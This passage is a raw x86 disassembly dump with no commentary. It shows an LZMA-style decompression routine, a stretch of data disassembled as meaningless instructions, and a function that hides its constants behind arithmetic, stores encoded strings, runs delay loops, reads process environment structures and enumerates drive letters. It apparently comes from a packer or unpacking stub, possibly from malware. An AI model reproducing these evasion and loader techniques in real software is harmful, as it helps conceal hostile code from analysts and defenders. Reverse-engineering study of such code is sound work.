  425f79:	jmp    0x425fca
  425f7b:	mov    al,0xc1
  425f7d:	dec    al
  425f7f:	call   0x4261d3
  425f84:	jne    0x425f9a
  425f86:	pop    eax
  425f87:	pop    edi
  425f88:	pop    edx
  425f89:	pop    ecx
  425f8a:	pop    edx
  425f8b:	pop    ecx
  425f8c:	push   DWORD PTR [esp]
  425f8f:	push   ecx
  425f90:	push   edx
  425f91:	mov    edx,0x664
  425f96:	mov    cl,0x0
  425f98:	jmp    0x42600d
  425f9a:	mov    al,0xcd
  425f9c:	dec    al
  425f9e:	call   0x4261d3
  425fa3:	jne    0x425fd3
  425fa5:	mov    al,0xf1
  425fa7:	dec    al
  425fa9:	call   0x4261c3
  425fae:	jne    0x426003
  425fb0:	pop    eax
  425fb1:	cmp    al,0x7
  425fb3:	mov    al,0x9
  425fb5:	jb     0x425fb9
  425fb7:	mov    al,0xb
  425fb9:	push   eax
  425fba:	mov    esi,DWORD PTR [ebp-0x4]
  425fbd:	sub    esi,DWORD PTR [ebp-0x24]
  425fc0:	cmp    esi,DWORD PTR [ebp+0x24]
  425fc3:	jb     0x42619a
  425fc9:	lods   al,BYTE PTR ds:[esi]
  425fca:	mov    edi,DWORD PTR [ebp-0x4]
  425fcd:	stos   BYTE PTR es:[edi],al
  425fce:	jmp    0x426161
  425fd3:	mov    al,0xd8
  425fd5:	call   0x4261d3
  425fda:	mov    esi,DWORD PTR [ebp-0x28]
  425fdd:	je     0x425ffa
  425fdf:	mov    al,0xe4
  425fe1:	call   0x4261d3
  425fe6:	mov    esi,DWORD PTR [ebp-0x2c]
  425fe9:	je     0x425ff4
  425feb:	mov    esi,DWORD PTR [ebp-0x30]
  425fee:	mov    ecx,DWORD PTR [ebp-0x2c]
  425ff1:	mov    DWORD PTR [ebp-0x30],ecx
  425ff4:	mov    ecx,DWORD PTR [ebp-0x28]
  425ff7:	mov    DWORD PTR [ebp-0x2c],ecx
  425ffa:	mov    ecx,DWORD PTR [ebp-0x24]
  425ffd:	mov    DWORD PTR [ebp-0x28],ecx
  426000:	mov    DWORD PTR [ebp-0x24],esi
  426003:	pop    eax
  426004:	pop    edi
  426005:	pop    ecx
  426006:	mov    edx,0xa68
  42600b:	mov    cl,0x8
  42600d:	add    edx,edi
  42600f:	push   edx
  426010:	push   edi
  426011:	cmp    al,0x7
  426013:	mov    al,cl
  426015:	jb     0x426019
  426017:	add    al,0x3
  426019:	push   eax
  42601a:	mov    ebp,DWORD PTR [ebp-0x34]
  42601d:	call   0x4261e0
  426022:	jne    0x426038
  426024:	mov    eax,DWORD PTR [ebp-0x18]
  426027:	mov    edi,DWORD PTR [ebp-0x34]
  42602a:	shl    eax,0x3
  42602d:	sub    ecx,ecx
  42602f:	push   0x8
  426031:	pop    esi
  426032:	lea    edi,[edi+eax*2+0x4]
  426036:	jmp    0x42606d
  426038:	mov    ebp,DWORD PTR [ebp-0x34]
  42603b:	add    ebp,0x2
  42603e:	call   0x4261e0
  426043:	jne    0x42605d
  426045:	mov    eax,DWORD PTR [ebp-0x18]
  426048:	mov    edi,DWORD PTR [ebp-0x34]
  42604b:	shl    eax,0x3
  42604e:	push   0x8
  426050:	pop    ecx
  426051:	push   0x8
  426053:	pop    esi
  426054:	lea    edi,[edi+eax*2+0x104]
  42605b:	jmp    0x42606d
  42605d:	mov    edi,0x204
  426062:	add    edi,DWORD PTR [ebp-0x34]
  426065:	push   0x10
  426067:	pop    ecx
  426068:	mov    esi,0x100
  42606d:	mov    DWORD PTR [ebp-0x1c],ecx
  426070:	sub    eax,eax
  426072:	inc    eax
  426073:	mov    ebp,edi
  426075:	call   0x4261e2
  42607a:	mov    ecx,eax
  42607c:	sub    ecx,esi
  42607e:	jb     0x426073
  426080:	add    DWORD PTR [ebp-0x1c],ecx
  426083:	cmp    DWORD PTR [ebp-0x3c],0x4
  426087:	jae    0x42613d
  42608d:	add    DWORD PTR [ebp-0x3c],0x7
  426091:	mov    ecx,DWORD PTR [ebp-0x1c]
  426094:	cmp    ecx,0x4
  426097:	jb     0x42609c
  426099:	push   0x3
  42609b:	pop    ecx
  42609c:	mov    edi,DWORD PTR [ebp-0x38]
  42609f:	shl    ecx,0x6
  4260a2:	sub    eax,eax
  4260a4:	inc    eax
  4260a5:	push   0x40
  4260a7:	pop    esi
  4260a8:	lea    edi,[edi+ecx*2+0x360]
  4260af:	mov    ebp,edi
  4260b1:	call   0x4261e2
  4260b6:	mov    ecx,eax
  4260b8:	sub    ecx,esi
  4260ba:	jb     0x4260af
  4260bc:	mov    DWORD PTR [ebp-0x18],ecx
  4260bf:	mov    DWORD PTR [ebp-0x24],ecx
  4260c2:	cmp    ecx,0x4
  4260c5:	jb     0x42613a
  4260c7:	mov    esi,ecx
  4260c9:	and    DWORD PTR [ebp-0x24],0x1
  4260cd:	shr    esi,1
  4260cf:	or     DWORD PTR [ebp-0x24],0x2
  4260d3:	dec    esi
  4260d4:	cmp    ecx,0xe
  4260d7:	jae    0x4260f2
  4260d9:	mov    eax,0x2af
  4260de:	sub    eax,ecx
  4260e0:	mov    ecx,esi
  4260e2:	shl    BYTE PTR [ebp-0x24],cl
  4260e5:	add    eax,DWORD PTR [ebp-0x24]
  4260e8:	shl    eax,1
  4260ea:	add    eax,DWORD PTR [ebp-0x38]
  4260ed:	mov    DWORD PTR [ebp-0x34],eax
  4260f0:	jmp    0x42611f
  4260f2:	sub    esi,0x4
  4260f5:	call   0x42619f
  4260fa:	shr    ebx,1
  4260fc:	shl    DWORD PTR [ebp-0x24],1
  4260ff:	cmp    DWORD PTR [ebp-0x20],ebx
  426102:	jb     0x42610a
  426104:	inc    DWORD PTR [ebp-0x24]
  426107:	sub    DWORD PTR [ebp-0x20],ebx
  42610a:	dec    esi
  42610b:	jne    0x4260f5
  42610d:	mov    eax,0x644
  426112:	add    eax,DWORD PTR [ebp-0x38]
  426115:	mov    DWORD PTR [ebp-0x34],eax
  426118:	shl    DWORD PTR [ebp-0x24],0x4
  42611c:	push   0x4
  42611e:	pop    esi
  42611f:	sub    edi,edi
  426121:	inc    edi
  426122:	mov    eax,edi
  426124:	mov    ebp,DWORD PTR [ebp-0x34]
  426127:	call   0x4261e2
  42612c:	test   al,0x1
  42612e:	je     0x426133
  426130:	or     DWORD PTR [ebp-0x24],edi
  426133:	shl    edi,1
  426135:	dec    esi
  426136:	jne    0x426124
  426138:	jmp    0x42613a
  42613a:	inc    DWORD PTR [ebp-0x24]
  42613d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426140:	add    ecx,0x2
  426143:	mov    edi,DWORD PTR [ebp-0x4]
  426146:	mov    eax,edi
  426148:	sub    eax,DWORD PTR [ebp+0x24]
  42614b:	cmp    DWORD PTR [ebp-0x24],eax
  42614e:	ja     0x42619a
  426150:	mov    esi,edi
  426152:	sub    esi,DWORD PTR [ebp-0x24]
  426155:	mov    edx,DWORD PTR [ebp+0x28]
  426158:	lods   al,BYTE PTR ds:[esi]
  426159:	stos   BYTE PTR es:[edi],al
  42615a:	cmp    edi,edx
  42615c:	jae    0x426161
  42615e:	dec    ecx
  42615f:	jne    0x426158
  426161:	mov    DWORD PTR [ebp-0x4],edi
  426164:	movzx  esi,al
  426167:	cmp    edi,DWORD PTR [ebp+0x28]
  42616a:	jb     0x425ecb
  426170:	call   0x42619f
  426175:	sub    eax,eax
  426177:	lea    ebp,[esp+0x3c]
  42617b:	mov    edx,DWORD PTR [ebp+0x20]
  42617e:	mov    esi,DWORD PTR [ebp-0x8]
  426181:	sub    esi,DWORD PTR [ebp+0x18]
  426184:	mov    DWORD PTR [edx],esi
  426186:	mov    dh,0xdd
  426188:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  42618e:	sbb    BYTE PTR [esi+0x1f5af70],ch
  426194:	add    eax,0x188f893
  426199:	jmp    0x37cbecd2
  42619e:	jmp    0x42612e
  4261a0:	ja     0x42612a
  4261a2:	mov    BYTE PTR [eax-0x6873ae74],cl
  4261a8:	(bad)  
  4261a9:	pop    ss
  4261aa:	test   al,0xe1
  4261ac:	mov    dh,0x5d
  4261ae:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  4261b3:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  4261b9:	test   al,0x3a
  4261bb:	scas   al,BYTE PTR es:[edi]
  4261bc:	popf   
  4261bd:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  4261c3:	mov    dh,0xbd
  4261c5:	fwait
  4261c6:	les    esp,FWORD PTR [edx-0x75]
  4261c9:	(bad)  
  4261ca:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  4261d2:	mov    al,ds:0x948b62c4
  4261d7:	popf   
  4261d8:	fwait
  4261d9:	mov    dh,0x3d
  4261db:	stos   DWORD PTR es:[edi],eax
  4261dc:	mov    esi,0x34889d39
  4261e1:	mov    edi,DWORD PTR [esi-0x717762c7]
  4261e7:	ja     0x426171
  4261e9:	mov    BYTE PTR [eax-0x4907aa74],cl
  4261ef:	mov    ecx,0x198f6818
  4261f4:	sbb    BYTE PTR [eax],cl
  4261f6:	test   al,0x74
  4261f8:	mov    ecx,0xfa55f918
  4261fd:	mov    dl,0xcc
  4261ff:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  426205:	test   al,0x88
  426207:	push   esp
  426208:	and    al,0x20
  42620a:	mov    ecx,ebx
  42620c:	movzx  edx,WORD PTR [ebp+0x0]
  426210:	shr    ecx,0xb
  426213:	imul   ecx,edx
  426216:	cmp    DWORD PTR [esp+0x20],ecx
  42621a:	jae    0x426233
  42621c:	mov    ebx,ecx
  42621e:	mov    ecx,0x800
  426223:	sub    ecx,edx
  426225:	shr    ecx,0x5
  426228:	add    WORD PTR [ebp+0x0],cx
  42622c:	add    eax,eax
  42622e:	lea    ebp,[esp+0x40]
  426232:	ret    
  426233:	shr    edx,0x5
  426236:	sub    DWORD PTR [esp+0x20],ecx
  42623a:	sub    ebx,ecx
  42623c:	sub    WORD PTR [ebp+0x0],dx
  426240:	add    eax,eax
  426242:	add    eax,0x1
  426245:	lea    ebp,[esp+0x40]
  426249:	ret    
  42624a:	push   ebp
  42624b:	mov    ebp,esp
  42624d:	sub    esp,0x12c
  426253:	push   ebx
  426254:	push   esi
  426255:	push   edi
  426256:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42625d:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426264:	mov    eax,DWORD PTR [ebp+0x8]
  426267:	mov    DWORD PTR [ebp+0x8],eax
  42626a:	mov    ecx,DWORD PTR [ebp-0x10]
  42626d:	mov    ebx,0x75108ae
  426272:	xor    ecx,ebx
  426274:	mov    eax,0x3272f5
  426279:	add    ecx,eax
  42627b:	mov    DWORD PTR [ebp-0x24],ecx
  42627e:	mov    ecx,DWORD PTR [ebp-0x10]
  426281:	xor    ecx,ebx
  426283:	add    ecx,eax
  426285:	mov    DWORD PTR [ebp-0x40],ecx
  426288:	mov    ecx,DWORD PTR [ebp-0x10]
  42628b:	xor    ecx,ebx
  42628d:	add    ecx,eax
  42628f:	mov    DWORD PTR [ebp-0x3c],ecx
  426292:	mov    ecx,DWORD PTR [ebp-0x10]
  426295:	xor    ecx,ebx
  426297:	add    ecx,eax
  426299:	mov    DWORD PTR [ebp-0xd8],ecx
  42629f:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  4262a6:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  4262ad:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  4262b4:	push   0x25
  4262b6:	pop    ecx
  4262b7:	mov    DWORD PTR [ebp-0x30],ecx
  4262ba:	mov    DWORD PTR [ebp-0x30],ecx
  4262bd:	push   0x65
  4262bf:	pop    ecx
  4262c0:	mov    DWORD PTR [ebp-0x30],ecx
  4262c3:	mov    DWORD PTR [ebp-0x30],ecx
  4262c6:	mov    DWORD PTR [ebp-0x30],0x4d
  4262cd:	mov    DWORD PTR [ebp-0x30],0x43
  4262d4:	mov    ecx,DWORD PTR [ebp-0x10]
  4262d7:	xor    ecx,ebx
  4262d9:	add    ecx,eax
  4262db:	mov    DWORD PTR [ebp-0x30],ecx
  4262de:	mov    ecx,DWORD PTR [ebp-0x10]
  4262e1:	xor    ecx,ebx
  4262e3:	add    ecx,eax
  4262e5:	mov    DWORD PTR [ebp-0x30],ecx
  4262e8:	mov    DWORD PTR [ebp-0x28],0x258
  4262ef:	mov    DWORD PTR [ebp-0x34],0x36
  4262f6:	mov    DWORD PTR [ebp-0x14],0x7a
  4262fd:	lea    edi,[ebp-0x10c]
  426303:	lea    esi,[ebp-0x12c]
  426309:	call   0x426fc9
  42630e:	dec    DWORD PTR [ebp-0x14]
  426311:	jne    0x4262fd
  426313:	dec    DWORD PTR [ebp-0x34]
  426316:	jne    0x4262f6
  426318:	dec    DWORD PTR [ebp-0x28]
  42631b:	jne    0x4262ef
  42631d:	mov    DWORD PTR [ebp-0x28],0x400e
  426324:	mov    eax,DWORD PTR [ebp-0x10]
  426327:	xor    eax,ebx
  426329:	mov    esi,0x3272f5
  42632e:	add    eax,esi
  426330:	mov    DWORD PTR [ebp-0x1c],eax
  426333:	mov    eax,DWORD PTR [ebp-0x10]
  426336:	and    DWORD PTR [ebp-0x94],0x0
  42633d:	xor    eax,ebx
  42633f:	add    eax,esi
  426341:	mov    DWORD PTR [ebp-0x38],eax
  426344:	mov    eax,fs:0x18
  42634a:	mov    DWORD PTR [ebp-0x94],eax
  426350:	mov    eax,DWORD PTR [eax+0x30]
  426353:	mov    DWORD PTR [ebp-0xcc],eax
  426359:	mov    eax,DWORD PTR [eax+0xc]
  42635c:	mov    DWORD PTR [ebp-0xc0],eax
  426362:	mov    eax,DWORD PTR [ebp+0x8]
  426365:	lea    ecx,[ebp-0x94]
  42636b:	mov    DWORD PTR [eax+0x1a0],ecx
  426371:	mov    eax,DWORD PTR [ebp+0x8]
  426374:	lea    ecx,[ebp-0xcc]
  42637a:	mov    DWORD PTR [eax+0x1a4],ecx
  426380:	mov    eax,DWORD PTR [ebp+0x8]
  426383:	push   DWORD PTR [ebp+0x8]
  426386:	lea    ecx,[ebp-0xc0]
  42638c:	mov    DWORD PTR [eax+0x1a8],ecx
  426392:	call   0x42878a
  426397:	mov    ecx,DWORD PTR [ebp-0x10]
  42639a:	xor    ecx,ebx
  42639c:	add    ecx,esi
  42639e:	cmp    ecx,eax
  4263a0:	je     0x426723
  4263a6:	mov    eax,DWORD PTR [ebp+0x8]
  4263a9:	mov    eax,DWORD PTR [eax+0x194]
  4263af:	mov    ecx,DWORD PTR [eax]
  4263b1:	mov    eax,DWORD PTR [ebp+0x8]
  4263b4:	mov    eax,DWORD PTR [eax+0x194]
  4263ba:	mov    eax,DWORD PTR [eax]
  4263bc:	add    eax,DWORD PTR [ecx+0x3c]
  4263bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4263c2:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4263c8:	lea    edx,[ebp-0xec]
  4263ce:	push   edx
  4263cf:	mov    edx,DWORD PTR [ebp+0x8]
  4263d2:	mov    edx,DWORD PTR [edx+0x18c]
  4263d8:	mov    edx,DWORD PTR [edx]
  4263da:	add    edx,DWORD PTR [eax+0x88]
  4263e0:	push   0x4
  4263e2:	push   DWORD PTR [eax+0x8c]
  4263e8:	push   edx
  4263e9:	call   DWORD PTR [ecx+0x1c]
  4263ec:	push   DWORD PTR [ebp+0x8]
  4263ef:	xor    eax,eax
  4263f1:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  4263fb:	mov    DWORD PTR [ebp-0xa4],0x12371120
  426405:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  42640f:	mov    BYTE PTR [ebp-0x9c],0x83
  426416:	lea    edi,[ebp-0x9b]
  42641c:	stos   DWORD PTR es:[edi],eax
  42641d:	stos   WORD PTR es:[edi],ax
  42641f:	stos   BYTE PTR es:[edi],al
  426420:	xor    eax,eax
  426422:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  42642c:	mov    DWORD PTR [ebp-0xb8],0x12371120
  426436:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  426440:	mov    BYTE PTR [ebp-0xb0],0x83
  426447:	lea    edi,[ebp-0xaf]
  42644d:	stos   DWORD PTR es:[edi],eax
  42644e:	stos   WORD PTR es:[edi],ax
  426450:	stos   BYTE PTR es:[edi],al
  426451:	mov    edi,DWORD PTR [ebp+0x8]
  426454:	mov    eax,DWORD PTR [ebp+0x8]
  426457:	mov    edx,DWORD PTR [eax+0x1b8]
  42645d:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426464:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42646b:	mov    WORD PTR [ebp-0x60],0x8340
  426471:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42647b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  426485:	mov    DWORD PTR [ebp-0x88],0x35201b13
  42648f:	mov    DWORD PTR [ebp-0x84],0x111c140c
  426499:	mov    DWORD PTR [ebp-0x80],0x83401e18
  4264a0:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  4264a7:	mov    DWORD PTR [ebp-0x78],0x17401120
  4264ae:	mov    DWORD PTR [ebp-0x74],0x35201b13
  4264b5:	mov    DWORD PTR [ebp-0x70],0x111c140c
  4264bc:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  4264c3:	call   0x4287b9
  4264c8:	push   eax
  4264c9:	mov    eax,DWORD PTR [ebp+0x8]
  4264cc:	mov    eax,DWORD PTR [eax+0x1a8]
  4264d2:	push   DWORD PTR [eax]
  4264d4:	call   0x42845a
  4264d9:	test   eax,eax
  4264db:	jne    0x42652d
  4264dd:	mov    eax,DWORD PTR [ebp+0x8]
  4264e0:	mov    eax,DWORD PTR [eax+0x1e0]
  4264e6:	mov    edi,DWORD PTR [ebp+0x8]
  4264e9:	add    eax,0x4
  4264ec:	mov    DWORD PTR [ebp-0x20],eax
  4264ef:	mov    eax,DWORD PTR [ebp+0x8]
  4264f2:	mov    edx,DWORD PTR [eax+0x1b8]
  4264f8:	call   0x4287b9
  4264fd:	push   eax
  4264fe:	mov    eax,DWORD PTR [ebp-0x20]
  426501:	call   DWORD PTR [eax]
  426503:	test   eax,eax
  426505:	jne    0x42652d
  426507:	mov    eax,DWORD PTR [ebp+0x8]
  42650a:	mov    eax,DWORD PTR [eax+0x1e0]
  426510:	mov    edi,DWORD PTR [ebp+0x8]
  426513:	add    eax,0x10
  426516:	mov    DWORD PTR [ebp-0x20],eax
  426519:	mov    eax,DWORD PTR [ebp+0x8]
  42651c:	mov    edx,DWORD PTR [eax+0x1b8]
  426522:	call   0x4287b9
  426527:	push   eax
  426528:	mov    eax,DWORD PTR [ebp-0x20]
  42652b:	call   DWORD PTR [eax]
  42652d:	mov    eax,DWORD PTR [ebp-0x10]
  426530:	mov    ecx,DWORD PTR [ebp-0x28]
  426533:	xor    eax,ebx
  426535:	add    eax,esi
  426537:	cmp    eax,ecx
  426539:	je     0x4266fc
  42653f:	mov    eax,DWORD PTR [ebp-0x18]
  426542:	xor    eax,ebx
  426544:	mov    ecx,0xffcd8d0b
  426549:	sub    ecx,eax
  42654b:	add    ecx,DWORD PTR [ebp-0x28]
  42654e:	mov    eax,DWORD PTR [ebp-0x1c]
  426551:	cmp    eax,ecx
  426553:	ja     0x4266fc
  426559:	mov    DWORD PTR [ebp-0x34],0x0
  426560:	push   DWORD PTR [ebp+0x8]
  426563:	mov    edi,DWORD PTR [ebp+0x8]
  426566:	mov    eax,DWORD PTR [ebp+0x8]
  426569:	mov    edx,DWORD PTR [eax+0x1b4]
  42656f:	call   0x4287b9
  426574:	push   eax
  426575:	mov    eax,DWORD PTR [ebp+0x8]
  426578:	mov    eax,DWORD PTR [eax+0x1a8]
  42657e:	push   DWORD PTR [eax]
  426580:	call   0x42845a
  426585:	mov    ecx,DWORD PTR [ebp+0x8]
  426588:	mov    ecx,DWORD PTR [ecx+0x19c]
  42658e:	mov    DWORD PTR [ecx],eax
  426590:	mov    eax,DWORD PTR [ebp+0x8]
  426593:	mov    edi,DWORD PTR [eax+0x1e0]
  426599:	mov    esi,DWORD PTR [ebp+0x8]
  42659c:	xor    eax,eax
  42659e:	lea    edx,[ebp-0x7c]
  4265a1:	call   0x4287ef
  4265a6:	push   eax
  4265a7:	mov    eax,DWORD PTR [ebp+0x8]
  4265aa:	mov    eax,DWORD PTR [eax+0x19c]
  4265b0:	push   DWORD PTR [eax]
  4265b2:	call   DWORD PTR [edi+0x8]
  4265b5:	mov    DWORD PTR [ebp-0x20],eax
  4265b8:	mov    eax,DWORD PTR [ebp+0x8]
  4265bb:	mov    edi,DWORD PTR [eax+0x1e0]
  4265c1:	mov    esi,DWORD PTR [ebp+0x8]
  4265c4:	xor    eax,eax
  4265c6:	lea    edx,[ebp-0x90]
  4265cc:	call   0x4287ef
  4265d1:	push   eax
  4265d2:	mov    eax,DWORD PTR [ebp+0x8]
  4265d5:	mov    eax,DWORD PTR [eax+0x19c]
  4265db:	push   DWORD PTR [eax]
  4265dd:	call   DWORD PTR [edi+0x8]
  4265e0:	mov    eax,DWORD PTR [ebp+0x8]
  4265e3:	mov    edi,DWORD PTR [eax+0x1e0]
  4265e9:	mov    esi,DWORD PTR [ebp+0x8]
  4265ec:	xor    eax,eax
  4265ee:	lea    edx,[ebp-0xa8]
  4265f4:	call   0x4287ef
  4265f9:	push   eax
  4265fa:	mov    eax,DWORD PTR [ebp+0x8]
  4265fd:	mov    eax,DWORD PTR [eax+0x19c]
  426603:	push   DWORD PTR [eax]
  426605:	call   DWORD PTR [edi+0x8]
  426608:	and    DWORD PTR [ebp-0x8],0x0
  42660c:	mov    DWORD PTR [ebp-0x48],eax
  42660f:	mov    eax,DWORD PTR [ebp-0x8]
  426612:	and    eax,0x7
  426615:	add    eax,0x31
  426618:	push   eax
  426619:	call   DWORD PTR [ebp-0x20]
  42661c:	test   eax,eax
  42661e:	je     0x426662
  426620:	mov    eax,DWORD PTR [ebp-0x8]
  426623:	push   0x19
  426625:	xor    edx,edx
  426627:	pop    ecx
  426628:	div    ecx
  42662a:	add    dl,0x41
  42662d:	movzx  eax,dl
  426630:	push   eax
  426631:	call   DWORD PTR [ebp-0x48]
  426634:	test   eax,eax
  426636:	jne    0x426662
  426638:	mov    eax,DWORD PTR [ebp+0x8]
  42663b:	mov    edi,DWORD PTR [eax+0x1e0]
  426641:	mov    esi,DWORD PTR [ebp+0x8]
  426644:	xor    eax,eax
  426646:	lea    edx,[ebp-0x68]
  426649:	call   0x4287ef
  42664e:	push   eax
  42664f:	mov    eax,DWORD PTR [ebp+0x8]
  426652:	mov    eax,DWORD PTR [eax+0x198]
  426658:	push   DWORD PTR [eax]
  42665a:	call   DWORD PTR [edi+0x8]
  42665d:	mov    DWORD PTR [ebp-0x14],eax
  426660:	jmp    0x426666
  426662:	and    DWORD PTR [ebp-0x14],0x0
  426666:	inc    DWORD PTR [ebp-0x8]
  426669:	cmp    DWORD PTR [ebp-0x8],0x10
  42666d:	jb     0x42660f
  42666f:	mov    eax,DWORD PTR [ebp-0x18]
  426672:	mov    esi,DWORD PTR [ebp+0x8]
  426675:	xor    eax,ebx
  426677:	mov    edi,0x3272f5
  42667c:	add    eax,edi
  42667e:	lea    edx,[ebp-0x10c]
  426684:	call   0x4287ef
  426689:	push   eax
  42668a:	mov    eax,DWORD PTR [ebp-0x10]
  42668d:	mov    esi,DWORD PTR [ebp+0x8]
  426690:	xor    eax,ebx
  426692:	add    eax,edi
  426694:	lea    edx,[ebp-0x12c]
  42669a:	call   0x4287ef
  42669f:	push   eax
  4266a0:	call   DWORD PTR [ebp-0x14]
  4266a3:	mov    ecx,DWORD PTR [ebp-0x10]
  4266a6:	xor    ecx,ebx
  4266a8:	add    ecx,edi
  4266aa:	cmp    ecx,eax
  4266ac:	jne    0x4266b5
  4266ae:	mov    DWORD PTR [ebp-0x34],0x1
  4266b5:	mov    eax,DWORD PTR [ebp-0x18]
  4266b8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266bb:	xor    eax,ebx
  4266bd:	lea    eax,[eax+ecx*1+0x3272f5]
  4266c4:	mov    DWORD PTR [ebp-0x1c],eax
  4266c7:	mov    eax,DWORD PTR [ebp-0x34]
  4266ca:	test   eax,eax
  4266cc:	je     0x4266e0
  4266ce:	mov    eax,DWORD PTR [ebp-0x18]
  4266d1:	mov    ecx,DWORD PTR [ebp-0x38]
  4266d4:	xor    eax,ebx
  4266d6:	lea    eax,[eax+ecx*1+0x3272f5]
  4266dd:	mov    DWORD PTR [ebp-0x38],eax
  4266e0:	mov    eax,DWORD PTR [ebp-0x18]
  4266e3:	xor    eax,ebx
  4266e5:	mov    ecx,0xffcd8d0b
  4266ea:	sub    ecx,eax
  4266ec:	add    ecx,DWORD PTR [ebp-0x28]
  4266ef:	mov    eax,DWORD PTR [ebp-0x1c]
  4266f2:	cmp    eax,ecx
  4266f4:	jbe    0x426559
  4266fa:	mov    esi,edi
  4266fc:	mov    eax,DWORD PTR [ebp-0x38]
  4266ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  426702:	cmp    ecx,eax
  426704:	jne    0x426717
  426706:	push   DWORD PTR [ebp+0x8]
  426709:	lea    eax,[ebp-0x40]
  42670c:	push   eax
  42670d:	call   0x42925e
  426712:	mov    DWORD PTR [ebp-0x24],eax
  426715:	jmp    0x426723
  426717:	mov    eax,DWORD PTR [ebp-0x24]
  42671a:	mov    ecx,DWORD PTR [ebp-0x18]
  42671d:	xor    ecx,ebx
  42671f:	add    ecx,esi
  426721:	xor    DWORD PTR [eax],ecx
  426723:	mov    eax,DWORD PTR [ebp-0x10]
  426726:	mov    ecx,DWORD PTR [ebp-0x24]
  426729:	xor    eax,ebx
  42672b:	add    eax,esi
  42672d:	cmp    eax,ecx
  42672f:	je     0x426ea7
  426735:	mov    eax,DWORD PTR [ebp-0x10]
  426738:	mov    ecx,DWORD PTR [ebp-0x40]
  42673b:	xor    eax,ebx
  42673d:	add    eax,esi
  42673f:	cmp    eax,ecx
  426741:	je     0x426ea7
  426747:	mov    eax,DWORD PTR [ebp-0x10]
  42674a:	xor    eax,ebx
  42674c:	add    eax,esi
  42674e:	jmp    0x42676c
  426750:	mov    edi,DWORD PTR [ebp-0x24]
  426753:	mov    cl,al
  426755:	and    cl,0x1f
  426758:	or     dl,0xff
  42675b:	sub    dl,cl
  42675d:	add    BYTE PTR [edi+eax*1],dl
  426760:	mov    ecx,DWORD PTR [ebp-0x18]
  426763:	xor    ecx,ebx
  426765:	lea    eax,[eax+ecx*1+0x3272f5]
  42676c:	mov    ecx,DWORD PTR [ebp-0x40]
  42676f:	cmp    eax,ecx
  426771:	jb     0x426750
  426773:	mov    eax,DWORD PTR [ebp-0x40]
  426776:	mov    DWORD PTR [ebp-0x28],eax
  426779:	mov    eax,DWORD PTR [ebp-0x24]
  42677c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426783:	mov    DWORD PTR [ebp-0xd4],eax
  426789:	mov    edi,0xf89c85a2
  42678e:	mov    DWORD PTR [ebp-0x2c],edi
  426791:	mov    eax,DWORD PTR [ebp-0x38]
  426794:	xor    eax,ebx
  426796:	add    eax,esi
  426798:	mov    DWORD PTR [ebp-0xc],eax
  42679b:	mov    eax,DWORD PTR [ebp-0x38]
  42679e:	xor    eax,ebx
  4267a0:	add    eax,esi
  4267a2:	mov    DWORD PTR [ebp-0x8],eax
  4267a5:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4267ac:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  4267b3:	mov    eax,DWORD PTR [ebp-0x38]
  4267b6:	mov    ecx,DWORD PTR [ebp-0x28]
  4267b9:	xor    eax,ebx
  4267bb:	add    eax,esi
  4267bd:	cmp    ecx,eax
  4267bf:	je     0x4269be
  4267c5:	jmp    0x42699a
  4267ca:	mov    ecx,DWORD PTR [ebp-0xc]
  4267cd:	mov    eax,DWORD PTR [ebp-0x28]
  4267d0:	sub    eax,ecx
  4267d2:	mov    ecx,DWORD PTR [ebp-0x48]
  4267d5:	xor    ecx,ebx
  4267d7:	add    ecx,esi
  4267d9:	xor    edx,edx
  4267db:	div    ecx
  4267dd:	mov    DWORD PTR [ebp-0x8],eax
  4267e0:	mov    eax,DWORD PTR [ebp-0x4c]
  4267e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4267e6:	xor    eax,ebx
  4267e8:	add    eax,esi
  4267ea:	cmp    ecx,eax
  4267ec:	jbe    0x4267f8
  4267ee:	mov    eax,DWORD PTR [ebp-0x4c]
  4267f1:	xor    eax,ebx
  4267f3:	add    eax,esi
  4267f5:	mov    DWORD PTR [ebp-0x8],eax
  4267f8:	mov    eax,DWORD PTR [ebp-0x48]
  4267fb:	mov    ecx,DWORD PTR [ebp-0x8]
  4267fe:	xor    eax,ebx
  426800:	add    eax,esi
  426802:	imul   eax,ecx
  426805:	mov    DWORD PTR [ebp-0x8],eax
  426808:	mov    eax,DWORD PTR [ebp-0x38]
  42680b:	mov    ecx,DWORD PTR [ebp-0x8]
  42680e:	xor    eax,ebx
  426810:	add    eax,esi
  426812:	cmp    ecx,eax
  426814:	je     0x426988
  42681a:	mov    eax,DWORD PTR [ebp-0x8]
  42681d:	mov    DWORD PTR [ebp-0x14],eax
  426820:	mov    eax,DWORD PTR [ebp-0xc]
  426823:	add    eax,DWORD PTR [ebp-0xd4]
  426829:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426830:	mov    DWORD PTR [ebp-0x34],edi
  426833:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  42683d:	mov    DWORD PTR [ebp-0x8],eax
  426840:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
